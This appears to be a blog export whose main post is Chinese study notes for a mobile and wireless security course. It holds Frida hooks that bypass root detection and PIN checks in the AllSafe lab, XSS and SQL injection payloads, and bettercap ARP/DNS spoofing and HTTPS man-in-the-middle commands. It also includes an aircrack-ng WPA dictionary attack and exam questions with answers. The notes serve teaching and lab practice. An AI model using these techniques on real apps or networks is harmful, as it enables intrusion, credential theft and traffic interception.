+AllSafe漏洞靶场靶场基本信息
+名称:Allsafe,GitHub:t0thkr1s/allsafe
+特点:不像CTF套壳题,更贴近真实APP的漏洞场景
+安装:adb install allsafe.apk
+
+Frida环境搭建(录音反复强调的部分,必须背熟)
+Kali装frida客户端:pip install frida,frida --version验证版本
+手机&#x2F;模拟器端要装对应架构的frida-server(查看架构:adb shell getprop ro.product.cpu.abi)——版本必须和客户端一致,这是录音里明确点出的坑
+push到手机:adb push frida-server /data/local/tmp/
+adb shell → su → chmod 755 frida-server → ./frida-server &amp;——&amp;让进程后台运行,shell断开后不会被杀掉
+
+Hook代码万能公式(所有hook题的核心结构)
+Java.perform(function () &#123;    var 目标类 = Java.use(&quot;完整包名.类名&quot;);    目标类.目标方法.implementation = function (参数) &#123;        // 记录/篡改逻辑        var result = this.目标方法(参数); // 可选:先调用原方法        return result; // 或直接返回篡改后的假值    &#125;;&#125;);
+Java.use()拿到目标类,.implementation =替换方法体——这是Frida hook Java方法的万能公式,几乎每道hook题都是这个结构
+Root检测绕过Hook代码分析(含RootBeer类)Java.perform(function () &#123;    var RootBeer = Java.use(&quot;com.scottyab.rootbeer.RootBeer&quot;);    RootBeer.isRooted.implementation = function () &#123;        console.log(&quot;[HOOK] isRooted() intercepted&quot;);        return false;    &#125;;&#125;);
+记RootBeer字符串问题:
+
+这段代码在干什么?对应AllSafe靶场里的哪个漏洞类型?
+Hook了RootBeer类的isRooted()方法,强制让它的返回值永远是false,对应AllSafe的Root Detection(Challenge 16)。
+
+
+为什么直接return false就能绕过检测,而不需要知道RootBeer内部到底检测了什么(su文件、busybox、build tags等)?
+因为Hook拦截的是方法的最终返回值,不管内部逻辑多复杂,最后都要汇总成一个布尔值返回给调用方。只要在这个”出口”上做手脚,就能一次性绕过所有内部检测逻辑,不需要逐一理解每种检测手段。
+
+
+如果把return false改成return true,运行结果会怎样?
+会让APP始终认为设备已root,如果APP有”检测到root就限制功能”的逻辑,反而会触发这个限制
+
+
+
+
+弱加密Hook代码分析（含WeakCryptography类）Java.perform(function () &#123;  var WeakCryptography = Java.use(&quot;infosecadventures.allsafe.challenges.WeakCryptography&quot;);  WeakCryptography.encrypt.implementation = function (value) &#123;    console.log(&quot;[WEAK CRYPTO] Hardcoded KEY: &quot; + ____________);   // 空1    var result = this.encrypt(value);    return result;  &#125;;  WeakCryptography.md5Hash.implementation = function (text) &#123;    var result = ____________;   // 空2    console.log(&quot;[WEAK CRYPTO] md5Hash output: &quot; + result);    return result;  &#125;;&#125;);[^1]
+问题:
+
+空1、空2分别应该填什么?
+WeakCryptography.KEY.value读取类的静态字段KEY的值    ，this.md5Hash(text)调用原始方法拿到真实计算结果,再打印出来
+
+
+这段代码揭示了几种”弱加密”的具体表现?分别是什么?
+①硬编码密钥——加密密钥被直接写死在代码里的静态字段中,可以被hook直接读出②弱哈希算法——用MD5做敏感数据处理。
+
+
+为什么用MD5做密码存储被认为是不安全的?
+MD5存在碰撞成本低、已有现成彩虹表的问题，可以通过预计算的哈希表快速反查出原文
+
+
+
+
+弱随机数Hook代码分析（含randomNumber方法）Java.perform(function () &#123;    var WeakCryptography = Java.use(&quot;infosecadventures.allsafe.challenges.WeakCryptography&quot;);    WeakCryptography.randomNumber.implementation = function () &#123;        var fake = &quot;1337&quot;;        console.log(&quot;[WEAK CRYPTO] randomNumber() called -&gt; returning fixed value: &quot; + fake);        return fake;    &#125;;&#125;);
+
+问题:
+
+这段代码和题目一的Hook套路相比,有什么本质区别?(提示:题目一是绕过检测,这题是什么目的?)
+题目一是验证”检测类”漏洞能否被绕过(篡改布尔判断结果);这题是验证”随机数生成本身是否可预测”，通过hook把原本应该”不可预测”的方法强行改成固定值,来演示如果攻击者能预测这个随机数生成逻辑会有什么后果。
+
+
+如果这个randomNumber()原本是用来生成短信验证码或者Token的,固定返回值会带来什么安全后果?
+攻击者可以提前预测出下一个验证码&#x2F;Token的值,从而绕过身份验证或话费&#x2F;会话劫持
+
+
+
+
+弱密码加密结合
+
+考点1(硬编码密钥):WeakCryptography.KEY.value能被直接读出来,说明加密密钥是写死在代码里的静态字段,
+考点2(弱哈希算法):MD5本身是不可逆的哈希算法,但用MD5做密码存储属于弱加密实践,因为MD5碰撞成本低、可被彩虹表暴力破解,
+考点3(弱随机数):randomNumber()被hook后返回固定值&quot;1337&quot;,说明原本这个方法生成的随机数可预测，导致依赖随机数的安全机制可以被预测
+考点4:你的运行结果截图里能看到 this.encrypt(value) **先调用原始方法再返回，Hook不是替换掉原逻辑,而是在执行前后插入自己的监控&#x2F;篡改代码
+
+综合分析题Hook代码分析（含checkPIN类）Java.perform(function () &#123;    var MainActivity = Java.use(&quot;com.example.target.MainActivity&quot;);    var checkPin = MainActivity.checkPin;    checkPin.implementation = function (input) &#123;        send(&quot;checkPin called with: &quot; + input);        var result = checkPin.call(this, input);        send(&quot;original result: &quot; + result);        return true;    &#125;;&#125;);
+
+问题:
+
+这是针对什么类型的验证逻辑做的Hook?
+针对PIN码校验逻辑的绕过。
+
+
+checkPin.call(this, input)这一行的作用是什么?去掉这一行,对最终绕过效果有没有影响?
+ 这一行是先调用原始的checkPin方法,拿到真实的校验结果并通过send()打印出来,方便调试观察原始逻辑到底返回了什么。去掉这一行不影响最终绕过效果，但会丢失”原始校验到底对不对”这个调试信息
+
+
+为什么最后不管result是什么,都要return true?
+因为不管用户输入的PIN对不对,只要最后统一返回true,APP就会认为校验永远通过,从而达到绕过PIN码验证的目的，篡改方法出口
+
+
+
+结合你实际做过的题,按漏洞类型整理(19项里考过的这几个是重点)：
+
+
+
+漏洞类型
+核心考点
+Hook&#x2F;绕过方式
+
+
+
+Root检测(Challenge 16)
+RootBeer.isRooted() 只需要hook最终布尔返回值
+return false
+
+
+弱加密(Weak Cryptography)
+三个子考点:                                     ①硬编码密钥(WeakCryptography.KEY.value可直接读出)                                         ②MD5弱哈希(可碰撞&#x2F;彩虹表)          ③弱随机数(randomNumber()返回值可预测,如固定值1337)
+hook encrypt&#x2F;md5Hash&#x2F;randomNumber 三个方法
+
+
+不安全的服务
+Service被导出(exported&#x3D;true),能被adb直接startservice调起
+adb shell am startservice -n 包名/Service类名
+
+
+PIN绕过
+Base64解码硬编码值,如NDg2Mw==→4863
+静态分析jadx即可,不一定要hook
+
+
+WebView漏洞
+XSS注入 &lt;script&gt;alert(&#39;12345&#39;)&lt;/script&gt;;本地文件读取 file:///etc/hosts
+说明WebView未禁用JS或未限制file协议
+
+
+Firebase未授权访问
+URL后加 /secret.json 直接读取数据库内容
+说明Firebase规则未设置鉴权
+
+
+SQL注入
+payload 1&#39; or 1=1 --
+工具drozer
+
+
+给你一段Java代码判断漏洞类型,思路(考试大概率这么问)：
+
+看有没有硬编码的KEY&#x2F;密码字符串 → 弱加密
+看有没有isRooted&#x2F;isDebuggerConnected这类布尔返回的检测方法 → 检测类绕过
+看有没有WebView相关设置(setJavaScriptEnabled)→ WebView漏洞
+看Service&#x2F;Activity的android:exported属性 → 组件导出风险
+
+IDA动态调试APK(第4讲,和so文件逆向结合)
+
+前提:手机Root + AndroidManifest.xml中debuggable=true
+adb shell am start -D -n &quot;包名/Activity&quot; 启动调试模式
+adb forward tcp:5005 jdwp:&lt;pid&gt; 转发Java层调试端口
+Native层需要push对应架构的android_server,chmod 755后运行,再adb forward tcp:23946 tcp:23946
+
+apktool&#x2F;apksigner工具链(实验一二用到的)
+java -jar apktool_2.6.0.jar d xxx.apk -o output_dir     # 反编译java -jar apktool_2.6.0.jar b output_dir -o new.apk     # 重打包java -jar apksigner.jar sign --ks key1.jks new.apk      # 签名(不签名装不上)
+
+
+so文件分析要用IDA Pro,JNI函数命名规则:Java_包名_类名_方法名,靠这个规则在IDA里定位Native入口
+
+无线渗透测试WLAN帧结构基础(填空高发)
+
+帧分3类:管理帧、控制帧、数据帧(数据帧无子类型)
+控制帧3种子类型:RTS(请求发送)、CTS(清除发送)、ACK(确认)
+FCS校验序列:32bit CRC
+
+监控模式命令链(和实验四完全对应)
+airmon-ng check kill          # 杀掉占用网卡的进程iwconfig wlan0 mode monitor   # 切换监听模式airmon-ng start wlan0         # 启动监听
+
+Bettercap三大攻击方式(录音点名必考)
+
+
+
+攻击方式
+命令
+原理
+
+
+
+ARP欺骗
+set arp.spoof.targets &lt;IP&gt; → arp.spoof on
+伪造ARP响应,让目标流量转发经过攻击机
+
+
+HTTP&#x2F;HTTPS代理
+http.proxy on &#x2F; https.proxy on
+中间人解密流量,https需要自签名证书,客户端要手动信任CA才能看到明文——你作业4做的就是这个,双机+kali+装CA证书流程
+
+
+DNS欺骗
+set dns.spoof.domains * → set dns.spoof.ip &lt;IP&gt; → dns.spoof on
+伪造DNS响应,把域名解析到攻击者指定IP
+
+
+
+考点1:为什么必须先手动信任bettercap生成的CA证书才能看到明文——因为HTTPS的信任链依赖客户端系统信任的CA列表,bettercap的证书是自签名的,不在系统信任列表里,浏览器&#x2F;APP会拒绝或警告;手动安装到手机的受信任凭据里之后,系统才会认为这个”中间人”证书合法,相当于让手机主动接受了一个不受官方CA机构认证的证书
+
+考点2:这本质上是中间人攻击(MITM)——bettercap伪装成网关,让手机的流量都先经过它解密再转发,这也是为什么必须和手机在同一个子网&#x2F;网段
+
+考点3:抓到淘宝、百度这类真实HTTPS网站的流量说明——只要客户端愿意信任你的CA证书,HTTPS本身并不能防御中间人攻击,HTTPS防的是”网络路径上被动窃听”,而不是”客户端主动信任了错误的证书”这种场景,这是很多人容易搞混的概念,大题里如果问”为什么装了证书HTTPS还能被破解”,答案就在这给一条命令&#x2F;脚本判断作用的思路
+
+看模块名前缀:arp.* → ARP欺骗;http.proxy&#x2F;https.proxy → 代理拦截;dns.spoof.* → DNS欺骗
+
+顺序不能乱的原因:比如必须先 net.probe on 发现目标,再 set arp.spoof.targets,最后才能 arp.spoof on——没确定目标就直接欺骗会失败
+
+HTTPS代理为什么装了CA证书还能被破解:HTTPS防的是被动窃听,不防客户端主动信任了错误的证书,这是中间人攻击(MITM)的本质,和你作业4的结论完全一致
+
+
+**aircrack-ng字典攻击
+aircrack-ng -w password.txt ctf.pcap
+
+
+前提是pcap里必须抓到完整的四次握手包(4-way handshake)
+为什么用字典而不暴力枚举:WPA-PSK的PBKDF2迭代次数高,暴力破解代价太大
+
+隐藏SSID识别原理(简答高发)
+
+路由器只是不在信标帧(Beacon frame)里广播SSID,但客户端连接时的Probe Request&#x2F;Response帧仍会携带SSID明文,用Wireshark抓包对比就能发现
+
+[^1]: 
+实验实验一:APK反编译&#x2F;签名
+apktool反编译命令:java -jar apktool_2.6.0.jar d xxx.apk -o output_dir
+重新打包命令:java -jar apktool_2.6.0.jar b output_dir -o new.apk
+为什么修改后的APK装不上——因为没签名,Android要求APK必须签名才能安装
+apksigner签名命令:java -jar apksigner.jar sign --ks key1.jks --ks-key-alias &lt;alias&gt; new.apk
+jks密钥库的作用:存放签名用的公私钥对
+AndroidManifest.xml中关键字段(package、权限声明、组件导出属性 exported)
+对着 DDCTF-Easy 和 AliCrackme_1 这类 crackme,大概率会问:smali代码里哪一行是判断逻辑(比如if-eq&#x2F;if-nez跳转),改哪个跳转能绕过校验
+
+
+实验三:HOOK动态分析(Frida,rps.apk &#x2F; ctf.py)这是录音里花最多篇幅强调的部分,几乎是逐字对应实验步骤在划重点:
+环境搭建流程(务必背熟,原文步骤基本就是考点)：
+
+Kali装frida:pip install frida,frida --version验证安装
+手机端(模拟器)装 frida-server,要选对应架构(真机arm&#x2F;arm64,模拟器x86&#x2F;x86_64)——版本要和frida客户端对上,这点录音里反复强调
+adb push 把frida-server传到手机
+adb shell → su → chmod 755 → ./frida-server &amp;——&amp;的作用是让进程后台运行,断开shell后不会被杀掉,这个考点原文明确点出来了
+
+ctf.py 代码解读(逐行讲解,这是重点中的重点)：
+Java.perform(() =&gt; &#123;   //确保代码在Java虚拟机环境准备好之后再执行,是Frida hook Java代码的固定写法  const MainActivity = Java.use(&#x27;com.example.seccon2015.rock_paper_scissors.MainActivity&#x27;);  const onClick = MainActivity.onClick;  onClick.implementation = function (v) &#123;  //:用自定义函数替换`onClick`的原始实现    send(&#x27;onClick&#x27;);           // 向Python端发消息,确认Hook触发    onClick.call(this, v);     // 调用原始onClick逻辑,不破坏正常流程    this.m.value = 0;          // Hook后修改成员变量m    this.n.value = 1;          // Hook后修改成员变量n    // this.cnt.value = 999;   // 被注释掉的部分——步骤8要求删掉这行    console.log(&#x27;Done:&#x27; + JSON.stringify(this.cnt));   //打印当前`cnt`变量,确认篡改是否生效  &#125;;&#125;);
+
+
+考点1:Java.use()获取类、.implementation = 替换方法实现,这是Frida Hook Java方法的标准套路,必须能讲清每一步作用
+考点2:为什么要先onClick.call(this, v)再改值——因为要保留原逻辑执行后再篡改结果,不能直接跳过原方法
+考点3:this.m&#x2F;this.n&#x2F;this.cnt 对应的是靶场APP(rock_paper_scissors)里Java源码的成员变量
+思考题:用Frida抓取任意APP通信数据——结合Bettercap做HTTPS中间人代理,配合手机安装自签名CA证书来解密流量
+
+填空题1. 在Kali上安装frida客户端的命令是 pip install ______,验证安装成功用 frida ______。
+
+答案:frida;–version
+
+2. frida-server必须选择和手机&#x2F;模拟器对应的______,常见的有真机的arm&#x2F;arm64,模拟器的x86&#x2F;x86_64。
+
+答案:架构(CPU architecture)
+
+3. 启动frida-server的完整命令链:adb shell → ______ → chmod 755 frida-server → ______。
+
+答案:su;.&#x2F;frida-server &amp;
+
+4. 在frida-server的启动命令末尾加 &amp; 的作用是 ______。
+
+答案:让进程在后台运行,这样shell断开连接后该进程不会被杀掉(结束&#x2F;挂断)
+
+5. Frida Hook Java方法的标准公式是:先用 ______ 获取目标类,再用 ______ 替换目标方法的实现。
+
+答案:Java.use(&quot;完整包名.类名&quot;);.implementation = function(...) {...}
+
+
+实验四:无线网络分析(airmon-ng &#x2F; wireshark &#x2F; aircrack-ng)命令链(原文步骤,直接是考点)：
+airmon-ng                      # 启动查看网卡airmon-ng check kill           # 杀掉占用网卡的进程iwconfig wlan0 mode monitor    # 切换监听模式airmon-ng start wlan0          # 开启监听wireshark                      # 抓包分析
+
+
+考点1:为什么要check kill——避免NetworkManager等进程抢占网卡导致监听失败
+考点2:隐藏SSID的原理——路由器只是不在信标帧里广播SSID,但客户端连接时的Probe Request&#x2F;Response帧里仍然会携带SSID明文,所以用Wireshark抓包对比”主机显示的SSID”和”Wireshark抓到的SSID”就能发现隐藏网络（这是实验目的里明确写的原理,很可能就是简答题）
+考点3:破解思考题命令
+
+aircrack-ng -w password.txt ctf.pcap
+
+这条命令是用password.txt作为密码字典,对ctf.pcap抓包文件里的WPA&#x2F;WPA2握手数据进行字典攻击破解,原理是把字典里每个候选密码通过PBKDF2算法和抓到的四次握手包做比对运算,匹配上就是真实密码。如果破解不成功,最应该先检查:①pcap文件里是否抓到了完整的四次握手包②密码是否真的在字典里
+
+考点4:“为什么要提供密码字典而不能暴力枚举”–(WPA-PSK的PBKDF2迭代次数高,暴力破解代价大,字典攻击更现实)
+
+填空题12. 进入监听模式的命令链:airmon-ng check ______ → iwconfig wlan0 mode ______ → airmon-ng ______ wlan0。
+
+答案:kill;monitor;start
+
+13. 执行airmon-ng check kill的目的是 ______。
+
+答案:杀掉可能占用无线网卡的进程(如NetworkManager、wpa_supplicant),避免它们抢占网卡导致监听模式启动失败或被自动切回managed模式
+
+14. 破解WPA&#x2F;WPA2密码的命令是:aircrack-ng -w ______ ______。
+
+答案:password.txt(字典文件);ctf.pcap(抓包文件)
+
+15. 使用aircrack-ng破解握手包的前提条件是,pcap文件里必须抓到完整的 ______。
+
+答案:四次握手包(4-way handshake)
+
+]]></content>
+      <categories>
+        <category>课业</category>
+      </categories>
+      <tags>
+        <tag>移动互联网安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>第二届铸剑杯预选赛misc复现</title>
+    <url>/2026/07/01/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E9%93%B8%E5%89%91%E6%9D%AF%E9%A2%84%E9%80%89%E8%B5%9Bmisc%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[Misc1-降维打击
+binwalk 分析有隐藏文件，进行分离
+
+得到了一个光栅图片
+
+
+利用一个光栅图的相关隐写工具进行提取爆破——Raster-Terminator
+  sudo apt updatesudo apt install python3-pippip3 install Pillowgit clone &lt;https://github.com/AabyssZG/Raster-Terminator.git&gt;cd Raster-Terminatorpython3 Raster-Terminator.py -i 光栅图.png
+
+得到：
+snowflakes are all 1.26 dimensions. 雪花都是1.26维度的Why are you a surface dwawddss
+
+How can we break through the boundaries of dimensions wwdssdww我们如何才能突破维度的边界
+dwawwdsdwdssasd ddwwasawwdddsss
+snowflakes are all 1.26 dimensions. 雪花都是1.26维度的，这是一个数学梗，科赫雪花的豪斯多夫维数是约 1.26，它是一条一维线段，却能填满二维平面的一部分，具有无限长度但有限面积的特点。
+里面dwawddss，wwdssdww，dwawwdsdwdssasd ， ddwwasawwdddsss都是不构成语句的额外的字符串。里面wasd四个字母重复出现，在键盘中wsad对应了上下左右键
+跟着移动
+
+然后说这个dwawwdsdwdssasd→wwdssdww→ddwwasawwdddsss→dwawddss可以拼接成一个小二维码
+Misc2 BB84
+查看wp，这个主要是量子密钥分发协议 BB84 的实现漏洞利用
+BB84通信协议：
+只有基一致时才能得到真实信息，否则丢弃。
+
+
+
+1. 客户端发送量子比特
+随机选择一个“基”：“+” 或 “x”，并随机选择极化值（0 或 1），例如：“+0” 表示用“+”基发送极化为 0 的光子。
+
+
+
+2. 服务器测量
+服务器也随机选择“+”或“x”基来测量每个量子比特。如果基相同，则测得正确极化；若不同，则结果随机且无意义。
+
+
+3. 经典信道协商
+双方通过普通网络（经典信道）公开各自使用的基。保留基相同的位，这些位组成共享密钥。
+
+
+
+
+
+
+主要漏洞是使用了 Python 的 random 模块，种子seed被泄露那么就可以
+
+使用相同的 seed 重新生成客户端的随机序列（基 + 极化）
+结合服务器的测量基，还原出共享密钥
+利用已知的 XOR 密钥解密 flag
+
+数据包都是TCP流量，肯定传输了什么
+
+
+
+查看前三个包的data字段
+得到：
+SEED:123456789
+XOR_KEY:8660ace90c0352f3
+x++x+x+xx++x+xxxxx++x+xxxxxx++x+（32）
+]]></content>
+  </entry>
+  <entry>
+    <title>测试templates功能</title>
+    <url>/2026/06/30/%E6%B5%8B%E8%AF%95templates%E5%8A%9F%E8%83%BD/</url>
+    <content><![CDATA[]]></content>
+      <categories>
+        <category>test</category>
+      </categories>
+      <tags>
+        <tag>tets</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>歌儿小录~</title>
+    <url>/2026/07/02/%E6%AD%8C%E5%84%BF%E5%B0%8F%E5%BD%95~/</url>
+    <content><![CDATA[《空空》
+“怎么好像有一阵风，在赶来的途中，说它懂我的梦，让我在它的怀抱中彻底放松”一直都觉得做梦是一件很神秘的事情，又活了一次，又经历了一次，很多人说每晚做梦是件很累的事情，但我觉得做梦是一个能在一个以自我意志主导的世界里沉溺的一件事，尽管控制不了所有事情发生的全部走向，但是这里只有我是清醒的，是真实感受存在的，就不用做什么事情都精打细算的度量考虑，简而言之，不用装
+“成长变成了我和我的隔阂”我去，这句歌词好神啊，就是每次听到这里都会一颤，就是说站在以往的我的角度会看我的现在，我根本不能想象到自己做了这么多以往所不能想象的决定，感觉现在的我比以往更勇敢了，也更能抗压了，以前那个小卡拉米到我现在这个处境早就吓😳了，而且自己对许多事物的看法都发生了很大的转变，以前是经常把自己代入某某视角去看一件事，但现在更多的是以一种外人视角去看待了，感觉把自己代入进去很消耗心神，而且我觉得就是自己代入时产生了情绪，比如怜悯我觉得这本身就是一种很自傲自私的想法，越长大越发现看不惯以往的自己，但没事都还只是小卡拉米，小打小闹小想法就由着去吧。
+
+阿苏拉则
+“无根之水落地，万物欲冲洗”第一次听这首歌是在小缘的播间，当时听的时候我就愣住了，好干净的一首歌，特别是歌曲里的彝语，感觉少数民族的语言好干净好干净的感觉，就是我听了有种直击心灵的感觉，特别是配上小缘的音色，好干净，有种从西藏留来的水，经过绿芽草地，流过牛羊炊野，慢慢的赶上我在草原漫步的足迹的感觉，好喜欢小缘唱的这首歌！而且第一次听这首歌的时候也是没忍住就哭了，就是觉得好干净好干净，反而衬得人的各种容面显露出来了，像是在给草原审判的感觉，而且越听到后面反而这种感觉越来越弱了，更像是一种心灵上的抚摸，在摸着你的头说：慢慢来，任何事情都会是好的结果。
+
+]]></content>
+      <categories>
+        <category>myself</category>
+      </categories>
+      <tags>
+        <tag>music</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>计网复习</title>
+    <url>/2026/07/06/%E8%AE%A1%E7%BD%91%E5%A4%8D%E4%B9%A0/</url>
+    <content><![CDATA[15个选择题（30分）+ 10个填空（20分）+ 5个简答加计算题（30分）+ 2个综合题（20分）网络层和传输层考前六章，前五章每章一个大题，第六章不考大题（纯手搓，有误的地方请指出）
+课后习题：1-19
+
+应用层数据长度为 100 字节：TCP 数据段总长度 &#x3D; 100 + 20 &#x3D; 120 字节IP 数据报总长度 &#x3D; 120+ 20 &#x3D; 140 字节链路层帧总长度 &#x3D; 140 + 18 &#x3D; 158 字节传输效率&#x3D;100&#x2F;158​≈63.3%
+应用层数据长度为 1000 字节：传输效率&#x3D;1000&#x2F;1058​≈94.5%
+
+2-16
+
+
+在码分多址（CDMA）通信中，每个站被分配一个唯一的码片序列。发送数据“1”时，发送该站的码片序列；发送数据“0”时，发送该码片序列的反码
+
+接收端收到的信号是所有发送站信号的线性叠加。
+
+需要分别计算 SS 与 A,B,C,DA,B,C,D 的内积，并除以 8
+
+A:A&#x3D;(−1,−1,−1,+1,+1,−1,+1,+1)  S&#x3D;(-1,+1,−3,+1,−1,−3,+1,+1)逐项相乘并求和：1−1+3+1−1+3+1+1&#x3D;88&#x2F;8 &#x3D; 1   A 站发送了数据 1
+
+B:B&#x3D;(−1,−1,+1,−1,+1,+1,+1,−1)逐项相乘并求和： 1−1−3−1−1−3+1−1&#x3D;−8-8&#x2F;8 &#x3D; -1 B 站发送了数据 0
+
+C:C&#x3D;(-1,+1,-1,+1,+1,+1,-1,−1)逐项相乘并求和：1−1+3+1−1−3+1−1&#x3D;00&#x2F;8 &#x3D; 0 C 站没有发送数据
+
+D：D&#x3D;(−1,+1,−1,−1,−1,−1,+1,−1)逐项相乘并求和：  1+1+3−1+1+3+1−1&#x3D;88&#x2F;8 &#x3D; 1 D 站发送了数据 1
+
+
+
+3-33
+
+
+
+动作
+交换表的状态
+向哪些端口转发帧
+说明
+
+
+
+A 发送帧给 D
+写入 (A, 1)
+所有的接口（除 1 外的 2,3,4,5,6）
+开始时交换表是空的，交换机不知道应向何接口转发帧
+
+
+D 发送帧给 A
+写入 (D, 4)
+1
+交换机已知道 A 连接在接口 1
+
+
+E 发送帧给 A
+写入 (E, 5) （并更新 A 的条目）
+1
+交换机已知道 A 连接在接口 1，现在知道 E 在接口 5
+
+
+A 发送帧给 E
+不变（更新 A 的计时器）
+5
+交换机已知道 E 连接在接口 5
+
+
+4-24分析表的信息：
+
+前段匹配的写法：
+首先一个ip地址32位，包括了网络位和主机位，就140.5.12.64&#x2F;26而言，&#x2F;26说明丫前面26位是网络位，后面的32-26&#x3D;6位是主机位，这里也可以延伸出求子网掩码，网络位全部定为1，主机位全部定为0，那么就是11111111 11111111 11111111 11000000 &#x3D; 255.255.255.192下面的ip地址都进行了简写：130.5.8&#x2F;24 – &gt; 130.5.8.0&#x2F;24，就是24位网络位，32-24&#x3D;8位主机位，前三字节为网络号，后面一个字节为主机号110.17&#x2F;16 180.15&#x2F;16  190.16&#x2F;16 –&gt; 110.71.0.0&#x2F;16  180.15.0.0&#x2F;16  190.16.0.0&#x2F;16 前两个字节为网络号，后面两个字节主机号丫
+
+
+确认R1
+可以确认路由器有三个接口m0,m1,m2，从前段匹配和下一跳地址可以看出它们分别连接了三个不同网段m0 -&gt; 110.71.0.0&#x2F;16m1 -&gt; 190.16.0.0&#x2F;16m2 -&gt; 180.15.0.0&#x2F;16
+
+
+对下一跳地址分析
+下一跳地址是数据包发送到下一个路由器的接口ip地址，那么根据分析可以得到还有三个路由器，它们的ip分别是190.16.6.2， 180.15.2.5 , 110 .71.4.5,再根据这三个路由器所在的网段，就可以把不同网段根据这三个路由器联系起来了这里路由器190.16.6.2连接130.5.8.0&#x2F;24网段时用的虚线，是因为这是路由器连接一个局域网，是一对多的广播型网络，而路由器R1端口m1连接190.16.0.0&#x2F;16局域网的实线，实际是R1 和 190.16.6.2 这两个路由器之间的连接，所以是实线
+
+
+
+4-31
+
+140.120.84.24&#x2F;20–&gt;&#x2F;20说明前20位是网络位，后面32-20&#x3D;12是主机位分析：因为是20位网络位，那么第三个字节的前4位是属于网络位，后四位是属于主机位那么就将第三字节的数84转成二进制–&gt;0101 0100 前四位是网络位，则网络位为140.120. 0101
+
+
+最小地址
+网络位保持不变，将主机位全部置为 0，其中最小地址也叫网络地址网络位140.120.0101 + 主机位0000 0000 0000 –&gt;将后面两个字节的二进制转换为十进制数–&gt;140.120.80.0
+
+
+最大地址
+网络位保持不变，将主机位全部置为1，其中最大地址也叫广播地址网络位140.120.0101 + 主机位1111 1111 1111 –&gt; 字节转为十进制 –&gt; 140.120.95.255
+
+
+地址掩码
+网络位都定为1，前面20位为1，主机位都定位0，后面12位为0，根据8位为一个字节11111111  11111111 11110000 00000000 –&gt; 255.255.240.0
+
+
+地址总数
+地址总数等于2的主机位数次方已知主机位为32-20 &#x3D; 12位那么等于2的12次方&#x3D;4096
+
+
+C类地址数
+C类地址，即&#x2F;24，也就是24个网络位，8个主机位，一般C类地址块包含2的八次方&#x3D;256个地址解法一：那么总地址数&#x2F;C类地址数 &#x3D; 4096&#x2F;256 &#x3D; 16解法二：&#x2F;20到&#x2F;24差了4位，2的四次方&#x3D;16
+
+
+
+4-33
+
+136.23.12.64&#x2F;26 –&gt; 前26位为网络位，后6位为主机位
+
+
+求新的网络前缀
+划分4个一样大的子网的话，要从主机位中借位数，因为现有的主机位数仅仅能表示136.23.12.64&#x2F;26这个网段，那么4为2的平方，就从主机位借2位，那么构成的新的网络前缀就是26+2&#x3D;28位
+
+
+每个子网地址数
+已知网络位为28 ，主机位为32-28&#x3D;4，地址数为2的4次方&#x3D;16
+
+
+每一个子网地址块
+已知前面求了每个子网地址数为16，那么每个子网的地址按顺序增加16因为网络位为28，则第四个字节的前四位属于网络位，后四位属于主机位起始地址是64子网1–&gt;136.23.12.64&#x2F;2864+16–&gt;子网2–&gt;136.23.12.80&#x2F;2880+16–&gt;子网3–&gt;136.23.12.96&#x2F;2896+16–&gt;子网4–&gt;136.23.12.112&#x2F;28这些就是子网地址块了
+
+
+求每个子网可分配给主机使用的最小和最大地址
+每个子网中的网络地址，即全0，和广播地址，即全1，不能分配给主机，那么可以分配的主机地址范围为 （网络地址+1， 广播地址-1）根据第三问能看出每个网段的子网范围：子网1 ：64-79-&gt;(64+1,79-1)-&gt;(65,78)子网2 ：80-95-&gt;(80+1, 95-1)-&gt;(81,94)子网3 ：96-111-&gt;(96+1, 111-1)-&gt;(97,110)子网4 ：112-127-&gt;(112+1, 127-1)-&gt;(113,126)
+
+
+
+5-35
+
+经过多少个 RTT 后，发送窗口大小达到 1 MB
+题目中”从慢开始传送“–&gt;对应慢启动算法慢启动算法：窗口呈指数级增长，即2的n次方,单位为KB1MB&#x3D; 1024KB2的n次方&#x3D;1024n&#x3D;10则要经过10个往返时延RTT
+
+
+传送成功共需要多少个 RTT？TCP 扩大的窗口够用吗？
+14RTT窗口可选最大值固定为2的30次方-1TCP 扩大的窗口够用
+
+
+有效吞吐率与链路带宽利用率
+有效吞吐率 &#x3D; 总数据量 &#x2F; 总耗时
+链路带宽利用率&#x3D;有效吞吐率&#x2F;链路带宽
+
+
+
+5-38
+
+TCP 拥塞控制核心规则:
+
+**慢开始：拥塞窗口cwnd 初始值为 1，每经过一个 RTT，cwnd指数增长,2的n次方，直到达到 ssthresh。
+拥塞避免：当 cwnd &gt;= ssthresh 时，每经过一个 RTT，cwnd 加 1线性增长。
+超时处理：当发生超时时：
+新的 ssthresh 设为发生拥塞时 cwnd 的一半（向下取整或按标准算法）。
+cwnd 重置为 1
+之后重新执行慢开始，直到达到新的 ssthresh 后进入拥塞避免。
+
+
+
+
+
+
+
+RTT
+拥塞窗口 cwnd
+阶段&#x2F;说明
+增长情况
+
+
+
+1
+1
+慢开始
+指数增长
+
+
+2
+2
+慢开始
+指数增长
+
+
+3
+4
+慢开始
+指数增长
+
+
+4
+8
+慢开始（达到初始阈值ssthresh &#x3D; 8）
+指数增长
+
+
+5
+9
+拥塞避免
+线性增长
+
+
+6
+10
+拥塞避免
+线性增长
+
+
+7
+11
+拥塞避免
+线性增长
+
+
+8
+12
+拥塞避免（此时发生超时）
+线性增长
+
+
+9
+1
+超时后重置（新阈值 6）
+重置cwnd&#x3D;1,新设阈值ssthresh &#x3D;12&#x2F;2 &#x3D; 6
+
+
+10
+2
+慢开始
+指数增长
+
+
+11
+4
+慢开始
+指数增长
+
+
+12
+6
+慢开始（达到新阈值ssthresh &#x3D; 6）
+指数增长
+
+
+13
+7
+拥塞避免
+线性增长
+
+
+14
+8
+拥塞避免
+线性增长
+
+
+15
+9
+拥塞避免
+线性增长
+
+
+那么拥塞窗口大小分别为：1,2,4,8,9,10,11,12,1,2,4,6,7,8,9,
+5-49UDP首部结构：一定要注意题目说的是十六进制存储的首部，那么1字节就是两位了
+
+
+
+源端口
+目的端口
+长度
+校验和
+
+
+
+2字节
+2字节
+2字节
+2字节
+
+
+CB84
+000D
+001C
+001C
+
+
+52100（十进制）
+13（十进制）
+28（十进制）
+用于进行差错检测
+
+
+
+源端口号
+2字节的十六进制CB84–&gt; 十进制52100
+
+
+目的端口号
